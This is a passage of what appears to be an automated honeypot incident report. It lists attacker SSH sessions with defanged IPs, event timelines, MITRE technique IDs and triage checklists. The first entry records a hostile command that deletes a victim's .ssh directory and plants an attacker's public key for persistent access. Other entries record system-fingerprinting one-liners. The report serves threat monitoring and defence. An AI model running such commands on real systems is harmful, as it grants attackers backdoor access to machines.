| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 14:39:34` | `cowrie.session.connect` |
| `2026-07-02 14:39:34` | `cowrie.client.version` |
| `2026-07-02 14:39:35` | `cowrie.client.kex` |
| `2026-07-02 14:39:36` | `cowrie.login.success` |
| `2026-07-02 14:39:37` | `cowrie.session.params` |
| `2026-07-02 14:39:37` | `cowrie.command.input` |
| `2026-07-02 14:39:37` | `cowrie.command.failed` |
| `2026-07-02 14:39:37` | `cowrie.log.closed` |
| `2026-07-02 14:39:38` | `cowrie.session.params` |
| `2026-07-02 14:39:38` | `cowrie.command.input` |
| `2026-07-02 14:39:38` | `cowrie.session.file_download` |
| `2026-07-02 14:39:38` | `cowrie.log.closed` |
| `2026-07-02 14:44:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.112[.]56` to AbuseIPDB if not already reported
- [ ] Block `14.103.112[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38d33e91e021

| Field | Detail |
|---|---|
| **Source IP** | `14.103.112[.]56` |
| **First Seen** | 2026-07-02 14:39 |
| **Last Seen** | 2026-07-02 14:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 14:39:53` | `cowrie.session.connect` |
| `2026-07-02 14:39:53` | `cowrie.client.version` |
| `2026-07-02 14:39:53` | `cowrie.client.kex` |
| `2026-07-02 14:39:54` | `cowrie.login.success` |
| `2026-07-02 14:39:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.112[.]56` to AbuseIPDB if not already reported
- [ ] Block `14.103.112[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8dbb5ff0d411

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 14:43 |
| **Last Seen** | 2026-07-02 14:43 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 14:43:03` | `cowrie.session.connect` |
| `2026-07-02 14:43:04` | `cowrie.client.version` |
| `2026-07-02 14:43:04` | `cowrie.client.kex` |
| `2026-07-02 14:43:10` | `cowrie.login.success` |
| `2026-07-02 14:43:13` | `cowrie.session.params` |
| `2026-07-02 14:43:13` | `cowrie.command.input` |
| `2026-07-02 14:43:15` | `cowrie.log.closed` |
| `2026-07-02 14:43:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4d24843a58b

| Field | Detail |
|---|---|
| **Source IP** | `120.48.75[.]127` |
| **First Seen** | 2026-07-02 14:43 |
| **Last Seen** | 2026-07-02 14:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 14:43:08` | `cowrie.session.connect` |
| `2026-07-02 14:43:11` | `cowrie.telnet.option` |
| `2026-07-02 14:43:11` | `cowrie.telnet.option` |
| `2026-07-02 14:44:11` | `cowrie.login.success` |
| `2026-07-02 14:44:12` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `120.48.75[.]127` to AbuseIPDB if not already reported
- [ ] Block `120.48.75[.]127` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91f360997e6c

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-02 14:48 |
| **Last Seen** | 2026-07-02 14:48 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 14:48:33` | `cowrie.session.connect` |
| `2026-07-02 14:48:34` | `cowrie.client.version` |
| `2026-07-02 14:48:34` | `cowrie.client.kex` |
| `2026-07-02 14:48:36` | `cowrie.login.success` |
| `2026-07-02 14:48:38` | `cowrie.session.params` |
| `2026-07-02 14:48:38` | `cowrie.command.input` |
| `2026-07-02 14:48:38` | `cowrie.command.input` |
| `2026-07-02 14:48:38` | `cowrie.command.input` |
| `2026-07-02 14:48:38` | `cowrie.command.input` |
| `2026-07-02 14:48:38` | `cowrie.command.input` |
| `2026-07-02 14:48:38` | `cowrie.command.success` |
| `2026-07-02 14:48:38` | `cowrie.command.input` |
| `2026-07-02 14:48:38` | `cowrie.command.input` |
| `2026-07-02 14:48:38` | `cowrie.command.input` |
| `2026-07-02 14:48:38` | `cowrie.command.input` |
| `2026-07-02 14:48:39` | `cowrie.log.closed` |
| `2026-07-02 14:48:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52833822ed5d

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 14:48 |
| **Last Seen** | 2026-07-02 14:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 14:48:57` | `cowrie.session.connect` |
| `2026-07-02 14:48:57` | `cowrie.client.version` |
| `2026-07-02 14:48:57` | `cowrie.client.kex` |
| `2026-07-02 14:48:58` | `cowrie.login.success` |
| `2026-07-02 14:49:00` | `cowrie.session.params` |
| `2026-07-02 14:49:00` | `cowrie.command.input` |
| `2026-07-02 14:49:01` | `cowrie.log.closed` |
| `2026-07-02 14:49:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74ce389ec933

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-07-02 14:51 |
| **Last Seen** | 2026-07-02 14:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 14:51:43` | `cowrie.session.connect` |
| `2026-07-02 14:51:43` | `cowrie.client.version` |
| `2026-07-02 14:51:43` | `cowrie.client.kex` |
| `2026-07-02 14:51:45` | `cowrie.login.success` |
| `2026-07-02 14:51:46` | `cowrie.session.params` |
| `2026-07-02 14:51:46` | `cowrie.command.input` |
| `2026-07-02 14:51:46` | `cowrie.command.input` |
| `2026-07-02 14:51:46` | `cowrie.command.input` |
| `2026-07-02 14:51:46` | `cowrie.command.input` |
| `2026-07-02 14:51:46` | `cowrie.command.input` |
| `2026-07-02 14:51:46` | `cowrie.command.success` |
| `2026-07-02 14:51:46` | `cowrie.command.input` |
| `2026-07-02 14:51:46` | `cowrie.command.input` |
| `2026-07-02 14:51:46` | `cowrie.command.input` |
| `2026-07-02 14:51:46` | `cowrie.command.input` |
| `2026-07-02 14:51:47` | `cowrie.log.closed` |
| `2026-07-02 14:51:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe941856724f

| Field | Detail |
|---|---|
| **Source IP** | `160.119.71[.]92` |
| **First Seen** | 2026-07-02 14:52 |
| **Last Seen** | 2026-07-02 14:52 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Content-Length: 518, Connection: close, User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0[.]0 Safari/537.36, Accept-Encoding: gzip, deflate, Next-Action: x` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 14:52:41` | `cowrie.session.connect` |
| `2026-07-02 14:52:41` | `cowrie.login.success` |
| `2026-07-02 14:52:42` | `cowrie.session.params` |
| `2026-07-02 14:52:42` | `cowrie.command.input` |
| `2026-07-02 14:52:42` | `cowrie.command.failed` |
| `2026-07-02 14:52:42` | `cowrie.command.input` |
| `2026-07-02 14:52:42` | `cowrie.command.failed` |
| `2026-07-02 14:52:42` | `cowrie.command.input` |
| `2026-07-02 14:52:42` | `cowrie.command.input` |
| `2026-07-02 14:52:42` | `cowrie.command.failed` |
| `2026-07-02 14:52:42` | `cowrie.command.input` |
| `2026-07-02 14:52:42` | `cowrie.command.failed` |
| `2026-07-02 14:52:42` | `cowrie.command.input` |
| `2026-07-02 14:52:42` | `cowrie.command.failed` |
| `2026-07-02 14:52:42` | `cowrie.command.input` |
| `2026-07-02 14:52:42` | `cowrie.command.failed` |
| `2026-07-02 14:52:42` | `cowrie.command.input` |
| `2026-07-02 14:52:42` | `cowrie.command.failed` |
| `2026-07-02 14:52:42` | `cowrie.command.input` |
| `2026-07-02 14:52:42` | `cowrie.command.input` |
| `2026-07-02 14:52:42` | `cowrie.command.failed` |
| `2026-07-02 14:52:42` | `cowrie.command.input` |
| `2026-07-02 14:52:42` | `cowrie.command.failed` |
| `2026-07-02 14:52:42` | `cowrie.command.input` |
| `2026-07-02 14:52:42` | `cowrie.command.input` |
| `2026-07-02 14:52:42` | `cowrie.command.input` |
| `2026-07-02 14:52:42` | `cowrie.command.input` |
| `2026-07-02 14:52:42` | `cowrie.command.failed` |
| `2026-07-02 14:52:42` | `cowrie.command.input` |
| `2026-07-02 14:52:42` | `cowrie.command.failed` |
| `2026-07-02 14:52:42` | `cowrie.command.input` |
| `2026-07-02 14:52:42` | `cowrie.command.input` |
| `2026-07-02 14:52:42` | `cowrie.command.failed` |
| `2026-07-02 14:52:42` | `cowrie.command.input` |
| `2026-07-02 14:52:42` | `cowrie.command.failed` |
| `2026-07-02 14:52:53` | `cowrie.log.closed` |
| `2026-07-02 14:52:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.119.71[.]92` to AbuseIPDB if not already reported
- [ ] Block `160.119.71[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8300105b1ff2

| Field | Detail |
|---|---|
| **Source IP** | `160.119.71[.]92` |
| **First Seen** | 2026-07-02 14:52 |
| **Last Seen** | 2026-07-02 14:53 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Content-Length: 522, Connection: close, User-Agent: Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0[.]0 Safari/537.36, Accept-Encoding: gzip, deflate, Next-Action: x` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 14:52:53` | `cowrie.session.connect` |
| `2026-07-02 14:52:53` | `cowrie.login.success` |
| `2026-07-02 14:52:54` | `cowrie.session.params` |
| `2026-07-02 14:52:54` | `cowrie.command.input` |
| `2026-07-02 14:52:54` | `cowrie.command.failed` |
| `2026-07-02 14:52:54` | `cowrie.command.input` |
| `2026-07-02 14:52:54` | `cowrie.command.failed` |
| `2026-07-02 14:52:54` | `cowrie.command.input` |
| `2026-07-02 14:52:54` | `cowrie.command.input` |
| `2026-07-02 14:52:54` | `cowrie.command.failed` |
| `2026-07-02 14:52:54` | `cowrie.command.input` |
| `2026-07-02 14:52:54` | `cowrie.command.failed` |
| `2026-07-02 14:52:54` | `cowrie.command.input` |
| `2026-07-02 14:52:54` | `cowrie.command.failed` |
| `2026-07-02 14:52:54` | `cowrie.command.input` |
| `2026-07-02 14:52:54` | `cowrie.command.failed` |
| `2026-07-02 14:52:54` | `cowrie.command.input` |
| `2026-07-02 14:52:54` | `cowrie.command.failed` |
| `2026-07-02 14:52:54` | `cowrie.command.input` |
| `2026-07-02 14:52:54` | `cowrie.command.input` |
| `2026-07-02 14:52:54` | `cowrie.command.failed` |
| `2026-07-02 14:52:54` | `cowrie.command.input` |
| `2026-07-02 14:52:54` | `cowrie.command.failed` |
| `2026-07-02 14:52:54` | `cowrie.command.input` |
| `2026-07-02 14:52:54` | `cowrie.command.input` |
| `2026-07-02 14:52:54` | `cowrie.command.input` |
| `2026-07-02 14:52:54` | `cowrie.command.input` |
| `2026-07-02 14:52:54` | `cowrie.command.failed` |
| `2026-07-02 14:52:54` | `cowrie.command.input` |
| `2026-07-02 14:52:54` | `cowrie.command.failed` |
| `2026-07-02 14:52:54` | `cowrie.command.input` |
| `2026-07-02 14:52:54` | `cowrie.command.input` |
| `2026-07-02 14:52:54` | `cowrie.command.failed` |
| `2026-07-02 14:52:54` | `cowrie.command.input` |
| `2026-07-02 14:52:54` | `cowrie.command.failed` |
| `2026-07-02 14:53:05` | `cowrie.log.closed` |
| `2026-07-02 14:53:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.119.71[.]92` to AbuseIPDB if not already reported
- [ ] Block `160.119.71[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13a99381214a

| Field | Detail |
|---|---|
| **Source IP** | `160.119.71[.]92` |
| **First Seen** | 2026-07-02 14:53 |
| **Last Seen** | 2026-07-02 14:53 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Content-Length: 518, Connection: close, User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0[.]0 Safari/537.36, Accept-Encoding: gzip, deflate, Next-Action: x` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 14:53:05` | `cowrie.session.connect` |
| `2026-07-02 14:53:06` | `cowrie.login.success` |
| `2026-07-02 14:53:07` | `cowrie.session.params` |
| `2026-07-02 14:53:07` | `cowrie.command.input` |
| `2026-07-02 14:53:07` | `cowrie.command.failed` |
| `2026-07-02 14:53:07` | `cowrie.command.input` |
| `2026-07-02 14:53:07` | `cowrie.command.failed` |
| `2026-07-02 14:53:07` | `cowrie.command.input` |
| `2026-07-02 14:53:07` | `cowrie.command.input` |
| `2026-07-02 14:53:07` | `cowrie.command.failed` |
| `2026-07-02 14:53:07` | `cowrie.command.input` |
| `2026-07-02 14:53:07` | `cowrie.command.failed` |
| `2026-07-02 14:53:07` | `cowrie.command.input` |
| `2026-07-02 14:53:07` | `cowrie.command.failed` |
| `2026-07-02 14:53:07` | `cowrie.command.input` |
| `2026-07-02 14:53:07` | `cowrie.command.failed` |
| `2026-07-02 14:53:07` | `cowrie.command.input` |
| `2026-07-02 14:53:07` | `cowrie.command.failed` |
| `2026-07-02 14:53:07` | `cowrie.command.input` |
| `2026-07-02 14:53:07` | `cowrie.command.input` |
| `2026-07-02 14:53:07` | `cowrie.command.failed` |
| `2026-07-02 14:53:07` | `cowrie.command.input` |
| `2026-07-02 14:53:07` | `cowrie.command.failed` |
| `2026-07-02 14:53:07` | `cowrie.command.input` |
| `2026-07-02 14:53:07` | `cowrie.command.input` |
| `2026-07-02 14:53:07` | `cowrie.command.input` |
| `2026-07-02 14:53:07` | `cowrie.command.input` |
| `2026-07-02 14:53:07` | `cowrie.command.failed` |
| `2026-07-02 14:53:07` | `cowrie.command.input` |
| `2026-07-02 14:53:07` | `cowrie.command.failed` |
| `2026-07-02 14:53:07` | `cowrie.command.input` |
| `2026-07-02 14:53:07` | `cowrie.command.input` |
| `2026-07-02 14:53:07` | `cowrie.command.failed` |
| `2026-07-02 14:53:07` | `cowrie.command.input` |
| `2026-07-02 14:53:07` | `cowrie.command.failed` |
| `2026-07-02 14:53:18` | `cowrie.log.closed` |
| `2026-07-02 14:53:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.119.71[.]92` to AbuseIPDB if not already reported
- [ ] Block `160.119.71[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7f4deb14b17

| Field | Detail |
|---|---|
| **Source IP** | `160.119.71[.]92` |
| **First Seen** | 2026-07-02 14:53 |
| **Last Seen** | 2026-07-02 14:53 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Content-Length: 503, Connection: close, User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.6998.135 Mobile Safari/537.36, Accept-Encoding: gzip, deflate, Next-Action: x` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 14:53:18` | `cowrie.session.connect` |
| `2026-07-02 14:53:18` | `cowrie.login.success` |
| `2026-07-02 14:53:19` | `cowrie.session.params` |
| `2026-07-02 14:53:19` | `cowrie.command.input` |
| `2026-07-02 14:53:19` | `cowrie.command.failed` |
| `2026-07-02 14:53:19` | `cowrie.command.input` |
| `2026-07-02 14:53:19` | `cowrie.command.failed` |
| `2026-07-02 14:53:19` | `cowrie.command.input` |
| `2026-07-02 14:53:19` | `cowrie.command.input` |
| `2026-07-02 14:53:19` | `cowrie.command.failed` |
| `2026-07-02 14:53:19` | `cowrie.command.input` |
| `2026-07-02 14:53:19` | `cowrie.command.failed` |
| `2026-07-02 14:53:19` | `cowrie.command.input` |
| `2026-07-02 14:53:19` | `cowrie.command.failed` |
| `2026-07-02 14:53:19` | `cowrie.command.input` |
| `2026-07-02 14:53:19` | `cowrie.command.failed` |
| `2026-07-02 14:53:19` | `cowrie.command.input` |
| `2026-07-02 14:53:19` | `cowrie.command.failed` |
| `2026-07-02 14:53:19` | `cowrie.command.input` |
| `2026-07-02 14:53:19` | `cowrie.command.input` |
| `2026-07-02 14:53:19` | `cowrie.command.failed` |
| `2026-07-02 14:53:19` | `cowrie.command.input` |
| `2026-07-02 14:53:19` | `cowrie.command.failed` |
| `2026-07-02 14:53:19` | `cowrie.command.input` |
| `2026-07-02 14:53:19` | `cowrie.command.input` |
| `2026-07-02 14:53:19` | `cowrie.command.input` |
| `2026-07-02 14:53:19` | `cowrie.command.input` |
| `2026-07-02 14:53:19` | `cowrie.command.failed` |
| `2026-07-02 14:53:19` | `cowrie.command.input` |
| `2026-07-02 14:53:19` | `cowrie.command.failed` |
| `2026-07-02 14:53:19` | `cowrie.command.input` |
| `2026-07-02 14:53:19` | `cowrie.command.input` |
| `2026-07-02 14:53:19` | `cowrie.command.failed` |
| `2026-07-02 14:53:19` | `cowrie.command.input` |
| `2026-07-02 14:53:19` | `cowrie.command.failed` |
| `2026-07-02 14:53:30` | `cowrie.log.closed` |
| `2026-07-02 14:53:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.119.71[.]92` to AbuseIPDB if not already reported
- [ ] Block `160.119.71[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f843038e7703

| Field | Detail |
|---|---|
| **Source IP** | `160.119.71[.]92` |
| **First Seen** | 2026-07-02 14:53 |
| **Last Seen** | 2026-07-02 14:53 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Content-Length: 522, Connection: close, User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0[.]0 Safari/537.36, Accept-Encoding: gzip, deflate, Next-Action: x` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 14:53:30` | `cowrie.session.connect` |
| `2026-07-02 14:53:31` | `cowrie.login.success` |
| `2026-07-02 14:53:32` | `cowrie.session.params` |
| `2026-07-02 14:53:32` | `cowrie.command.input` |
| `2026-07-02 14:53:32` | `cowrie.command.failed` |
| `2026-07-02 14:53:32` | `cowrie.command.input` |
| `2026-07-02 14:53:32` | `cowrie.command.failed` |
| `2026-07-02 14:53:32` | `cowrie.command.input` |
| `2026-07-02 14:53:32` | `cowrie.command.input` |
| `2026-07-02 14:53:32` | `cowrie.command.failed` |
| `2026-07-02 14:53:32` | `cowrie.command.input` |
| `2026-07-02 14:53:32` | `cowrie.command.failed` |
| `2026-07-02 14:53:32` | `cowrie.command.input` |
| `2026-07-02 14:53:32` | `cowrie.command.failed` |
| `2026-07-02 14:53:32` | `cowrie.command.input` |
| `2026-07-02 14:53:32` | `cowrie.command.failed` |
| `2026-07-02 14:53:32` | `cowrie.command.input` |
| `2026-07-02 14:53:32` | `cowrie.command.failed` |
| `2026-07-02 14:53:32` | `cowrie.command.input` |
| `2026-07-02 14:53:32` | `cowrie.command.input` |
| `2026-07-02 14:53:32` | `cowrie.command.failed` |
| `2026-07-02 14:53:32` | `cowrie.command.input` |
| `2026-07-02 14:53:32` | `cowrie.command.failed` |
| `2026-07-02 14:53:32` | `cowrie.command.input` |
| `2026-07-02 14:53:32` | `cowrie.command.input` |
| `2026-07-02 14:53:32` | `cowrie.command.input` |
| `2026-07-02 14:53:32` | `cowrie.command.input` |
| `2026-07-02 14:53:32` | `cowrie.command.failed` |
| `2026-07-02 14:53:32` | `cowrie.command.input` |
| `2026-07-02 14:53:32` | `cowrie.command.failed` |
| `2026-07-02 14:53:32` | `cowrie.command.input` |
| `2026-07-02 14:53:32` | `cowrie.command.input` |
| `2026-07-02 14:53:32` | `cowrie.command.failed` |
| `2026-07-02 14:53:32` | `cowrie.command.input` |
| `2026-07-02 14:53:32` | `cowrie.command.failed` |
| `2026-07-02 14:53:43` | `cowrie.log.closed` |
| `2026-07-02 14:53:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.119.71[.]92` to AbuseIPDB if not already reported
- [ ] Block `160.119.71[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b583695678f4

| Field | Detail |
|---|---|
| **Source IP** | `160.119.71[.]92` |
| **First Seen** | 2026-07-02 14:53 |
| **Last Seen** | 2026-07-02 14:53 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Content-Length: 518, Connection: close, User-Agent: Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0[.]0 Safari/537.36, Accept-Encoding: gzip, deflate, Next-Action: x` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 14:53:43` | `cowrie.session.connect` |
| `2026-07-02 14:53:43` | `cowrie.login.success` |
| `2026-07-02 14:53:44` | `cowrie.session.params` |
| `2026-07-02 14:53:44` | `cowrie.command.input` |
| `2026-07-02 14:53:44` | `cowrie.command.failed` |
| `2026-07-02 14:53:44` | `cowrie.command.input` |
| `2026-07-02 14:53:44` | `cowrie.command.failed` |
| `2026-07-02 14:53:44` | `cowrie.command.input` |
| `2026-07-02 14:53:44` | `cowrie.command.input` |
| `2026-07-02 14:53:44` | `cowrie.command.failed` |
| `2026-07-02 14:53:44` | `cowrie.command.input` |
| `2026-07-02 14:53:44` | `cowrie.command.failed` |
| `2026-07-02 14:53:44` | `cowrie.command.input` |
| `2026-07-02 14:53:44` | `cowrie.command.failed` |
| `2026-07-02 14:53:44` | `cowrie.command.input` |
| `2026-07-02 14:53:44` | `cowrie.command.failed` |
| `2026-07-02 14:53:44` | `cowrie.command.input` |
| `2026-07-02 14:53:44` | `cowrie.command.failed` |
| `2026-07-02 14:53:44` | `cowrie.command.input` |
| `2026-07-02 14:53:44` | `cowrie.command.input` |
| `2026-07-02 14:53:44` | `cowrie.command.failed` |
| `2026-07-02 14:53:44` | `cowrie.command.input` |
| `2026-07-02 14:53:44` | `cowrie.command.failed` |
| `2026-07-02 14:53:44` | `cowrie.command.input` |
| `2026-07-02 14:53:44` | `cowrie.command.input` |
| `2026-07-02 14:53:44` | `cowrie.command.input` |
| `2026-07-02 14:53:44` | `cowrie.command.input` |
| `2026-07-02 14:53:44` | `cowrie.command.failed` |
| `2026-07-02 14:53:44` | `cowrie.command.input` |
| `2026-07-02 14:53:44` | `cowrie.command.failed` |
| `2026-07-02 14:53:44` | `cowrie.command.input` |
| `2026-07-02 14:53:44` | `cowrie.command.input` |
| `2026-07-02 14:53:44` | `cowrie.command.failed` |
| `2026-07-02 14:53:44` | `cowrie.command.input` |
| `2026-07-02 14:53:44` | `cowrie.command.failed` |
| `2026-07-02 14:53:55` | `cowrie.log.closed` |
| `2026-07-02 14:53:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.119.71[.]92` to AbuseIPDB if not already reported
- [ ] Block `160.119.71[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fc4d0f1a789

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 14:54 |
| **Last Seen** | 2026-07-02 14:55 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 14:54:52` | `cowrie.session.connect` |
